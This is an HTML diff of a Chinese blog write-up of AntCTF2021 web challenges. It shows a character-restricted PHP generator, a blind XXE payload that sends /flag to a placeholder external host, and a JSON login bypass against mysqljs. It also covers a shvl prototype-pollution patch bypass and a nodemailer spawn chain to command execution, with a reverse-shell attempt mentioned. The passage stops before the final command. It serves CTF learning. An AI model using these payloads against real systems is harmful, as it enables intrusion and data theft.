@@ -5,18 +5,18 @@
     
     <title>AntCTF2021 部分WP | Math &amp; Sec ，HACHp1的个人博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="AntCTF2021 部分WP  shellgen2  题目要求  real_cloud_storage 8-bit pub  题目功能点 参数绑定的绕过以及万能密码 nodemailer库文档学习，任意文件读取 shvl原型链污染漏洞patch的绕过 原型链污染链挖掘与艰难的绕过 其他的解法  dnslog 污染 shell 参数">
+    <meta name="description" content="AntCTF2021 部分WP shellgen2 题目要求   real_cloud_storage 8-bit pub 题目功能点 参数绑定的绕过以及万能密码 nodemailer库文档学习，任意文件读取 shvl原型链污染漏洞patch的绕过 原型链污染链挖掘与艰难的绕过 其他的解法 dnslog 污染 shell 参数         AntCTF2021 部分WPAntCTF结束了，">
 <meta name="keywords" content="Web安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="AntCTF2021 部分WP">
 <meta property="og:url" content="https://hachp1.github.io/posts/Web安全/20210309-ant2021.html">
 <meta property="og:site_name" content="Math &amp; Sec ，HACHp1的个人博客">
-<meta property="og:description" content="AntCTF2021 部分WP  shellgen2  题目要求  real_cloud_storage 8-bit pub  题目功能点 参数绑定的绕过以及万能密码 nodemailer库文档学习，任意文件读取 shvl原型链污染漏洞patch的绕过 原型链污染链挖掘与艰难的绕过 其他的解法  dnslog 污染 shell 参数">
+<meta property="og:description" content="AntCTF2021 部分WP shellgen2 题目要求   real_cloud_storage 8-bit pub 题目功能点 参数绑定的绕过以及万能密码 nodemailer库文档学习，任意文件读取 shvl原型链污染漏洞patch的绕过 原型链污染链挖掘与艰难的绕过 其他的解法 dnslog 污染 shell 参数         AntCTF2021 部分WPAntCTF结束了，">
 <meta property="og:image" content="http://159.75.52.53/img/thumbnails/cat.jpg">
 <meta property="og:updated_time" content="2021-10-29T11:39:31.120Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="AntCTF2021 部分WP">
-<meta name="twitter:description" content="AntCTF2021 部分WP  shellgen2  题目要求  real_cloud_storage 8-bit pub  题目功能点 参数绑定的绕过以及万能密码 nodemailer库文档学习，任意文件读取 shvl原型链污染漏洞patch的绕过 原型链污染链挖掘与艰难的绕过 其他的解法  dnslog 污染 shell 参数">
+<meta name="twitter:description" content="AntCTF2021 部分WP shellgen2 题目要求   real_cloud_storage 8-bit pub 题目功能点 参数绑定的绕过以及万能密码 nodemailer库文档学习，任意文件读取 shvl原型链污染漏洞patch的绕过 原型链污染链挖掘与艰难的绕过 其他的解法 dnslog 污染 shell 参数         AntCTF2021 部分WPAntCTF结束了，">
 <meta name="twitter:image" content="http://159.75.52.53/img/thumbnails/cat.jpg">
     
 
@@ -248,42 +248,39 @@
             
 			<!-- TOC -->
 <ul>
-<li><a href="#antctf2021-部分wp">AntCTF2021 部分WP</a>
-<ul>
-<li><a href="#shellgen2">shellgen2</a>
-<ul>
+<li><a href="#antctf2021-部分wp">AntCTF2021 部分WP</a><ul>
+<li><a href="#shellgen2">shellgen2</a><ul>
 <li><a href="#题目要求">题目要求</a></li>
-</ul></li>
+</ul>
+</li>
 <li><a href="#real_cloud_storage">real_cloud_storage</a></li>
-<li><a href="#8-bit-pub">8-bit pub</a>
-<ul>
+<li><a href="#8-bit-pub">8-bit pub</a><ul>
 <li><a href="#题目功能点">题目功能点</a></li>
 <li><a href="#参数绑定的绕过以及万能密码">参数绑定的绕过以及万能密码</a></li>
 <li><a href="#nodemailer库文档学习任意文件读取">nodemailer库文档学习，任意文件读取</a></li>
 <li><a href="#shvl原型链污染漏洞patch的绕过">shvl原型链污染漏洞patch的绕过</a></li>
 <li><a href="#原型链污染链挖掘与艰难的绕过">原型链污染链挖掘与艰难的绕过</a></li>
-<li><a href="#其他的解法">其他的解法</a>
-<ul>
+<li><a href="#其他的解法">其他的解法</a><ul>
 <li><a href="#dnslog">dnslog</a></li>
 <li><a href="#污染-shell-参数">污染 <code>shell</code> 参数</a></li>
-</ul></li>
-</ul></li>
-</ul></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
 </ul>
 <!-- /TOC -->
-<h1 id="antctf2021-部分wp">AntCTF2021 部分WP</h1>
-<p>AntCTF结束了，抱群里大腿，战队拿了第15名，TLS流啤。这次AntCTF的质量较高，学到了一些东西，在这里记录一下做题过程中相关的思路。</p>
+<h1 id="AntCTF2021-部分WP"><a href="#AntCTF2021-部分WP" class="headerlink" title="AntCTF2021 部分WP"></a>AntCTF2021 部分WP</h1><p>AntCTF结束了，抱群里大腿，战队拿了第15名，TLS流啤。这次AntCTF的质量较高，学到了一些东西，在这里记录一下做题过程中相关的思路。</p>
 <a id="more"></a>
-<h2 id="shellgen2">shellgen2</h2>
-<h3 id="题目要求">题目要求</h3>
-<ul>
+<h2 id="shellgen2"><a href="#shellgen2" class="headerlink" title="shellgen2"></a>shellgen2</h2><h3 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h3><ul>
 <li>编写一个python脚本，输入任意的小写字符串，输出一个可执行的PHP脚本，要求该脚本输出之前输入的小写字符串，并且除了php标签外，只能使用<code>0-9$_;+[].=&lt;?&gt;</code>中的字符；输出的PHP脚本要尽可能的短。waf具体的描述：</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(phpshell)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> phpshell.startswith(<span class="string">b'&lt;?php'</span>):</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    phpshell = phpshell[<span class="number">6</span>:]</div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> phpshell:</div><div class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">b'0-9$_;+[].=&lt;?&gt;'</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            print(chr(c), end=<span class="string">''</span>)</div><div class="line">    <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure>
 <ul>
 <li>题目乍一看，是要求写一个能够较灵活生成php的生成器，而且只有很少的字符可用。在这里分为输出、变量储存、字符生成三部分来分析：</li>
 </ul>
-<ol type="1">
+<ol>
 <li>输出：考虑使用<code>&lt;?=</code>短标签输出字符串。</li>
 <li>变量储存：为了使生成的PHP脚本尽可能短，首先使用<code>09_</code>字符构建变量名储存生成的a-z字符，在这里可以采用<code>09_</code>的所有排列来进行储存，类似于字典，以最大限度缩短payload。需要注意的是，只能将<code>_</code>放在第一位。</li>
 <li>字符生成：为了生成a-z，使用两个[]字符串拼接得到<code>ArrayArray</code>，然后用0自增到3以取到其中的<code>a</code>；再使用自增得到字符a-z。</li>
@@ -291,36 +288,32 @@
 <p>最后的python脚本为：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">input_a=input()</div><div class="line"></div><div class="line">beg=<span class="string">'''&lt;?php $_=[].[];$_999=0;$_999++;$_999++;$_999++;$_=$_[$_999];$____=$_;'''</span></div><div class="line"></div><div class="line">par=<span class="string">'_09'</span></div><div class="line"></div><div class="line">let_dic=&#123;&#125;</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>):</div><div class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">3</span>):</div><div class="line">            let_dic[chr(<span class="number">97</span>+p+j*<span class="number">3</span>+i*<span class="number">3</span>*<span class="number">3</span>)]=<span class="string">"$_"</span>+par[i]+par[j]+par[p]</div><div class="line"></div><div class="line">keys=list(let_dic.keys())</div><div class="line"></div><div class="line">let_dic[keys[i]]+<span class="string">'=$_;'</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">25</span>):</div><div class="line">    beg+=<span class="string">'$_++;'</span>+let_dic[keys[i+<span class="number">1</span>]]+<span class="string">'=$_;'</span></div><div class="line"></div><div class="line">beg+=<span class="string">'?&gt;&lt;?='</span>+let_dic[input_a[<span class="number">0</span>]]</div><div class="line"></div><div class="line"><span class="keyword">for</span> let <span class="keyword">in</span> input_a[<span class="number">1</span>:]:</div><div class="line">    beg+=<span class="string">'.'</span>+let_dic[let]</div><div class="line"></div><div class="line">beg+=<span class="string">';'</span></div><div class="line">print(beg,end=<span class="string">""</span>)</div></pre></td></tr></table></figure>
 <p>有一点坑的地方是，原题目没有说具体后台的执行过程，如果仅看题目给的waf信息，在PHP头的地方会不能正确解析（直接截断了 <code>&lt;?php</code> ），在这里卡了很长时间，此处暴打出题人，很坑爹。</p>
-<h2 id="real_cloud_storage">real_cloud_storage</h2>
-<ul>
+<h2 id="real-cloud-storage"><a href="#real-cloud-storage" class="headerlink" title="real_cloud_storage"></a>real_cloud_storage</h2><ul>
 <li>这道题过程很简单，但是有些细节比较坑，还有对服务端和客户端的运行过程的合理猜测。</li>
 <li>一个上传页面，说是把储存放在了云上，就没有危险了:)传一个马试试，发现上传过程设置了上传的储存url<code>endpoint</code>，可以设置为任意URL：</li>
 </ul>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">POST</span> <span class="string">/upload</span> HTTP/1.1</div><div class="line"><span class="attribute">Host</span>: fn10051969.serverless.cloud.d3ctf.io</div><div class="line"><span class="attribute">User-Agent</span>: xxx</div><div class="line"><span class="attribute">Accept</span>: */*</div><div class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</div><div class="line"><span class="attribute">Referer</span>: http://69889ba1b2.real-cloud-storage.d3ctf.io/</div><div class="line"><span class="attribute">Content-Type</span>: application/json</div><div class="line"><span class="attribute">Origin</span>: http://69889ba1b2.real-cloud-storage.d3ctf.io</div><div class="line"><span class="attribute">Content-Length</span>: 82</div><div class="line"><span class="attribute">Connection</span>: close</div><div class="line"><span class="attribute">DNT</span>: 1</div><div class="line"><span class="attribute">Sec-GPC</span>: 1</div><div class="line"></div><div class="line">&#123;"endpoint":"xxx_url","key":"xxx","bucket":"xxx","file":"xxx"&#125;</div></pre></td></tr></table></figure>
 <p>开始的时候没啥头绪，尝试直接访问oss，发现返回了XML。猜测客户端将文件发送到oss，之后oss返回的XML会被客户端解析，所以可能有XXE。</p>
-<p>直接一波老生常谈的XXE盲打（oss伪造服务器使用<a href="https://requestrepo.com/" class="uri" target="_blank" rel="external">https://requestrepo.com/</a>搭建， <code>Content-Type</code> 改为 <code>application/xml</code> ，注意！要把状态码改为404，因为原oss就是返回了404，否则客户端不会解析XML）：</p>
+<p>直接一波老生常谈的XXE盲打（oss伪造服务器使用<a href="https://requestrepo.com/" target="_blank" rel="external">https://requestrepo.com/</a>搭建， <code>Content-Type</code> 改为 <code>application/xml</code> ，注意！要把状态码改为404，因为原oss就是返回了404，否则客户端不会解析XML）：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span> </div><div class="line"><span class="meta">&lt;!DOCTYPE ANY [ </span></div><div class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "file:///flag"&gt;</span></div><div class="line"><span class="meta">&lt;!ENTITY % dtd SYSTEM "http://xxx/data.dtd"&gt;</span></div><div class="line"><span class="meta">%dtd; %payload; %send;</span></div><div class="line"><span class="meta">]&gt;</span></div></pre></td></tr></table></figure>
 <p>vps:</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;!ENTITY % payload "&lt;!ENTITY &amp;#37; send SYSTEM 'http://xxx/?data=%file;'&gt;"&gt;</div></pre></td></tr></table></figure>
 <p>把endpoint改为requestrepo的url之后在apache日志中找到flag：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">8.210.87.229 - - [09/Mar/2021:16:10:44 +0800] "GET /?data1=d3ctf&#123;2158ba78921c668b152584deb052f5152e33e943&#125;|only cluster" 400 0 "-" "-"</div></pre></td></tr></table></figure>
-<h2 id="bit-pub">8-bit pub</h2>
-<ul>
+<h2 id="8-bit-pub"><a href="#8-bit-pub" class="headerlink" title="8-bit pub"></a>8-bit pub</h2><ul>
 <li>这道题是综合性比较强的题，整个污染链比较有意思，用一个第三方小众库的0day结合nodemailer的一些特性和内部代码进行RCE，并且由于环境具有很多限制，需要多次尝试原型链污染的过程。</li>
 <li>整个题的知识点有：</li>
 </ul>
-<ol type="1">
+<ol>
 <li>mysqljs与nodejs的特性绕过参数绑定的SQL查询。</li>
 <li>shvl库的漏洞修复commit的绕过。</li>
 <li>nodemailer的原型链污染执行链挖掘。</li>
 <li>nodemailer文档学习和利用。</li>
 </ol>
-<h3 id="题目功能点">题目功能点</h3>
-<p>题目给了源码，可以直接本地搭建，题目功能比较简单，注册、登陆、管理员功能页面。在最开始的时候，题目是可以直接注册admin用户的，后来被修复。</p>
-<h3 id="参数绑定的绕过以及万能密码">参数绑定的绕过以及万能密码</h3>
-<p>由于nodejs对json请求会直接解析的特性，我们查阅文档并注意到<a href="https://github.com/mysqljs/mysql#escaping-query-values" class="uri" target="_blank" rel="external">https://github.com/mysqljs/mysql#escaping-query-values</a>中写到：</p>
+<h3 id="题目功能点"><a href="#题目功能点" class="headerlink" title="题目功能点"></a>题目功能点</h3><p>题目给了源码，可以直接本地搭建，题目功能比较简单，注册、登陆、管理员功能页面。在最开始的时候，题目是可以直接注册admin用户的，后来被修复。</p>
+<h3 id="参数绑定的绕过以及万能密码"><a href="#参数绑定的绕过以及万能密码" class="headerlink" title="参数绑定的绕过以及万能密码"></a>参数绑定的绕过以及万能密码</h3><p>由于nodejs对json请求会直接解析的特性，我们查阅文档并注意到<a href="https://github.com/mysqljs/mysql#escaping-query-values" target="_blank" rel="external">https://github.com/mysqljs/mysql#escaping-query-values</a>中写到：</p>
 <blockquote>
-<p>Objects are turned into key = ‘val’ pairs for each enumerable property on the object.</p>
+<p>Objects are turned into key = ‘val’ pairs for each enumerable property on the object. </p>
 </blockquote>
 <p>我们找到源码 <code>modules\users.js</code> 中：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">signin: <span class="function"><span class="keyword">function</span>(<span class="params">username, password, done</span>) </span>&#123;</div><div class="line">    sql.query(</div><div class="line">        <span class="string">"SELECT * FROM users WHERE username = ? AND password = ?"</span>,</div><div class="line">        [username, password],</div><div class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">err, res</span>) </span>&#123;</div><div class="line">            <span class="keyword">if</span> (err) &#123;</div><div class="line">                <span class="built_in">console</span>.log(<span class="string">"error: "</span>, err);</div><div class="line">                <span class="keyword">return</span> done(err, <span class="literal">null</span>);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="keyword">return</span> done(<span class="literal">null</span>, res);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    );</div><div class="line">&#125;,</div></pre></td></tr></table></figure>
@@ -328,27 +321,22 @@
 <figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="attr">"username"</span>:<span class="string">"admin"</span>,<span class="attr">"password"</span>:&#123;<span class="attr">"password"</span>:<span class="number">1</span>&#125;&#125;</div></pre></td></tr></table></figure>
 <p>mysql语句将会把password解析为 <code>key-value</code> 键值对，从而绕过登录：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username = <span class="string">'admin'</span> <span class="keyword">AND</span> <span class="keyword">password</span> = <span class="string">`password`</span> = <span class="number">1</span> ;</div></pre></td></tr></table></figure>
-<h3 id="nodemailer库文档学习任意文件读取">nodemailer库文档学习，任意文件读取</h3>
-<p>登录admin之后，进入admin功能页面，是一个向外发送邮件的功能，这里需要去查nodemailer相关的文档，可以向任意邮箱发送带有附件的邮件。其中，有两种方法都可以把服务器的文件发送出来，达到任意文件读取的目的：</p>
-<ol type="1">
-<li><a href="https://nodemailer.com/message/" class="uri" target="_blank" rel="external">https://nodemailer.com/message/</a>，text参数如果是<code>path:xxx</code>键值对，就可以将文件内容以文本形式发送给任意邮箱：</li>
+<h3 id="nodemailer库文档学习，任意文件读取"><a href="#nodemailer库文档学习，任意文件读取" class="headerlink" title="nodemailer库文档学习，任意文件读取"></a>nodemailer库文档学习，任意文件读取</h3><p>登录admin之后，进入admin功能页面，是一个向外发送邮件的功能，这里需要去查nodemailer相关的文档，可以向任意邮箱发送带有附件的邮件。其中，有两种方法都可以把服务器的文件发送出来，达到任意文件读取的目的：</p>
+<ol>
+<li><a href="https://nodemailer.com/message/" target="_blank" rel="external">https://nodemailer.com/message/</a>，text参数如果是<code>path:xxx</code>键值对，就可以将文件内容以文本形式发送给任意邮箱：</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">text - The plaintext version of the message as an Unicode string, Buffer, Stream or an attachment-like object (&#123;path: &apos;/var/data/…&apos;&#125;)</div></pre></td></tr></table></figure>
-<ol start="2" type="1">
-<li><a href="https://nodemailer.com/message/attachments/" class="uri" target="_blank" rel="external">https://nodemailer.com/message/attachments/</a>，<code>attachments</code>参数可以直接把文件当作附件整个发出：</li>
+<ol start="2">
+<li><a href="https://nodemailer.com/message/attachments/" target="_blank" rel="external">https://nodemailer.com/message/attachments/</a>，<code>attachments</code>参数可以直接把文件当作附件整个发出：</li>
 </ol>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">attachments: [</div><div class="line"></div><div class="line">    ...&#123; <span class="comment">// file on disk as an attachment</span></div><div class="line">        filename: <span class="string">'text3.txt'</span>,</div><div class="line">        path: <span class="string">'/path/to/file.txt'</span> <span class="comment">// stream this file</span></div><div class="line">    &#125;,</div><div class="line">    &#123; <span class="comment">// filename and content type is derived from path</span></div><div class="line">        path: <span class="string">'/path/to/file.txt'</span></div><div class="line">    &#125;,</div><div class="line">    ...</div><div class="line">]</div></pre></td></tr></table></figure>
-<h3 id="shvl原型链污染漏洞patch的绕过">shvl原型链污染漏洞patch的绕过</h3>
-<p>整个admin的代码很简单，就是一个参数设置与一个邮件发送：</p>
+<h3 id="shvl原型链污染漏洞patch的绕过"><a href="#shvl原型链污染漏洞patch的绕过" class="headerlink" title="shvl原型链污染漏洞patch的绕过"></a>shvl原型链污染漏洞patch的绕过</h3><p>整个admin的代码很简单，就是一个参数设置与一个邮件发送：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> send = <span class="built_in">require</span>(<span class="string">"../utils/mail"</span>);</div><div class="line"><span class="keyword">const</span> shvl = <span class="built_in">require</span>(<span class="string">"shvl"</span>);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">    home: <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> res.sendView(<span class="string">"admin.html"</span>);</div><div class="line">    &#125;,</div><div class="line"></div><div class="line">    email: <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</div><div class="line">        <span class="keyword">let</span> contents = &#123;&#125;;</div><div class="line"></div><div class="line">        <span class="built_in">Object</span>.keys(req.body).forEach(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</div><div class="line">            shvl.set(contents, key, req.body[key]); <span class="comment">//将contents的key对象设置为key对应的值（post传入 key=value）</span></div><div class="line">        &#125;);</div><div class="line"></div><div class="line">        contents.from = <span class="string">'"admin" &lt;admin@8-bit.pub&gt;'</span>;</div><div class="line"></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            <span class="keyword">await</span> send(contents); <span class="comment">//漏洞触发点？发送邮件</span></div><div class="line">            <span class="keyword">return</span> res.json(&#123;</div><div class="line">                message: <span class="string">"Success."</span></div><div class="line">            &#125;);</div><div class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</div><div class="line">            <span class="keyword">return</span> res.status(<span class="number">500</span>).json(&#123;</div><div class="line">                message: err.message</div><div class="line">            &#125;);</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
-<p>注意到 <code>shvl</code> 库的使用，很像是原型链污染，直接在github翻到：<a href="https://github.com/robinvdvleuten/shvl/issues/34" class="uri" target="_blank" rel="external">https://github.com/robinvdvleuten/shvl/issues/34</a>，说到 <code>2.0.1</code> 版本有原型链污染，但是这道题是 <code>2.0.2</code> ，已经修复了漏洞，我们看一下修复patch，检查了有没有 <code>__proto__</code> 字符串：</p>
-<figure>
-<img src="http://159.75.52.53/img/blogimg/antctf2021/shvlpatch.png" alt="patch"><figcaption>patch</figcaption>
-</figure>
+<p>注意到 <code>shvl</code> 库的使用，很像是原型链污染，直接在github翻到：<a href="https://github.com/robinvdvleuten/shvl/issues/34" target="_blank" rel="external">https://github.com/robinvdvleuten/shvl/issues/34</a>，说到 <code>2.0.1</code> 版本有原型链污染，但是这道题是 <code>2.0.2</code> ，已经修复了漏洞，我们看一下修复patch，检查了有没有 <code>__proto__</code> 字符串：</p>
+<p><img src="http://159.75.52.53/img/blogimg/antctf2021/shvlpatch.png" alt="patch"></p>
 <p>然而可以轻松绕过，见<a href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution#prototype-pollution" target="_blank" rel="external">NodeJS - <strong>proto</strong> &amp; prototype Pollution</a>：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">something.constructor.prototype.sayHey = <span class="number">123</span>;</div></pre></td></tr></table></figure>
-<h3 id="原型链污染链挖掘与艰难的绕过">原型链污染链挖掘与艰难的绕过</h3>
-<p>根据源码，原型链污染之后就是发送邮件的操作，找到nodemailer库里的 <code>node_modules\nodemailer\lib\sendmail-transport\index.js</code> 注意到：</p>
+<h3 id="原型链污染链挖掘与艰难的绕过"><a href="#原型链污染链挖掘与艰难的绕过" class="headerlink" title="原型链污染链挖掘与艰难的绕过"></a>原型链污染链挖掘与艰难的绕过</h3><p>根据源码，原型链污染之后就是发送邮件的操作，找到nodemailer库里的 <code>node_modules\nodemailer\lib\sendmail-transport\index.js</code> 注意到：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="keyword">const</span> spawn = <span class="built_in">require</span>(<span class="string">'child_process'</span>).spawn;</div><div class="line">...</div><div class="line"></div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    sendmail = <span class="keyword">this</span>._spawn(<span class="keyword">this</span>.path, args);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>注意在 <code>node_modules\nodemailer\lib\nodemailer.js</code> 中，如果要执行到 <code>spawn</code> 语句，需要先污染 <code>options.sendmail=ture</code> ：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (options.pool) &#123;</div><div class="line">    transporter = <span class="keyword">new</span> SMTPPool(options);</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (options.sendmail) &#123; <span class="comment">//注意这里</span></div><div class="line">    transporter = <span class="keyword">new</span> SendmailTransport(options);</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (options.streamTransport) &#123;</div><div class="line">    transporter = <span class="keyword">new</span> StreamTransport(options);</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (options.jsonTransport) &#123;</div><div class="line">    transporter = <span class="keyword">new</span> JSONTransport(options);</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (options.SES) &#123;</div><div class="line">    transporter = <span class="keyword">new</span> SESTransport(options);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    transporter = <span class="keyword">new</span> SMTPTransport(options);</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
@@ -356,29 +344,22 @@
 <figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">child_process.spawn(command[, args][, options])</div><div class="line"></div><div class="line"><span class="keyword">const</span> &#123;</div><div class="line">    spawn</div><div class="line">&#125; = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</div><div class="line"><span class="keyword">const</span> ls = spawn(<span class="string">'ls'</span>, [<span class="string">'-lh'</span>, <span class="string">'/usr'</span>]);</div></pre></td></tr></table></figure>
 <p>跟python的subprocess类似，需要传list的参数。 <code>this.path</code> 能够直接污染，追一下 <code>args</code> ：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.args) &#123;</div><div class="line">    <span class="comment">// force -i to keep single dots</span></div><div class="line">    args = [<span class="string">'-i'</span>].concat(<span class="keyword">this</span>.args).concat(envelope.to);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    args = [<span class="string">'-i'</span>].concat(envelope.from ? [<span class="string">'-f'</span>, envelope.from] : []).concat(envelope.to);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><code>args</code> 需要对 <code>['-i']</code> 进行拼接，这里就比较坑了，如果不符合语法，就会执行失败，现在我们需要找到一个命令，格式为： <code>xxx -i xx xx xx</code> 。这个地方卡了比较久，最后群里大师傅用了 <code>sh -i -c 'xxx'</code> ，能够执行命令。</p>
+<p><code>args</code> 需要对 <code>[&#39;-i&#39;]</code> 进行拼接，这里就比较坑了，如果不符合语法，就会执行失败，现在我们需要找到一个命令，格式为： <code>xxx -i xx xx xx</code> 。这个地方卡了比较久，最后群里大师傅用了 <code>sh -i -c &#39;xxx&#39;</code> ，能够执行命令。</p>
 <p>开始的时候，尝试用bash反弹shell，结果返回 <code>spawn bash ENOENT</code> ，网上说是因为命令不存在导致：</p>
-<figure>
-<img src="http://159.75.52.53/img/blogimg/antctf2021/dne.png" alt="does not exist"><figcaption>does not exist</figcaption>
-</figure>
+<p><img src="http://159.75.52.53/img/blogimg/antctf2021/dne.png" alt="does not exist"></p>
 <p>没有bash就不太好反弹shell了，此外，环境还有其他各种限制，看hint： <code>PS: Try to execute /readflag</code> ，结合之前sendmail的任意文件读取，可以先把执行结果写入文件，再把文件传到邮箱里。</p>
 <p>先发post包执行命令：</p>
